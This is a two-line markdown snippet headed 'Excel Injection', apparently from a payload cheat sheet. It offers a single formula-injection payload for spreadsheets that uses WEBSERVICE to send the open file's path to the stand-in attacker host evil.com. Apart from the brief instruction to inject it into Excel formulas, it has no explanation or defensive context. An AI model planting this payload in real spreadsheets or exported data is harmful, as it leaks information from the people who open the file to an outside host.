# Excel Injection

Inject into excel formulas: 

```
"&WEBSERVICE("http://evil.com/"&CELL("Filename",A1))&"
```